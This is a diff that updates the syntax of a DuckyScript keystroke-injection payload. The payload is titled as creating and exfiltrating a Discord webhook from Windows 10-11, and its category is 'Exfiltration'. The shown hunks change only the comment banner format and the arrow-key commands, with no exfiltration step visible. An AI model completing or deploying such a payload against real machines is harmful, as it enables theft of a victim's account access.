@@ -1,12 +1,15 @@
-REM ###############################################################
-REM #                                                             |
-REM # Title        : Create And Exfiltrate A Webhook Of Discord   |
-REM # Author       : Aleff                                        |
-REM # Version      : 1.0                                          |
-REM # Category     : Exfiltration                                 |
-REM # Target       : Windows 10-11                                |
-REM #                                                             |
-REM ###############################################################
+REM_BLOCK
+###############################################################
+#                                                             #
+# Title        : Create And Exfiltrate A Webhook Of Discord   #
+# Author       : Aleff                                        #
+# Version      : 1.0                                          #
+# Category     : Exfiltration                                 #
+# Target       : Windows 10-11                                #
+#                                                             #
+###############################################################
+END_REM
+
 
 REM Requirements:
 REM     - Internet connection
@@ -115,11 +118,11 @@ TAB
 DELAY 500
 TAB
 DELAY 500
-DOWN_ARROW
+DOWNARROW
 DELAY 500
-DOWN_ARROW
+DOWNARROW
 DELAY 500
-DOWN_ARROW
+DOWNARROW
 DELAY 500
 ENTER
 DELAY 500
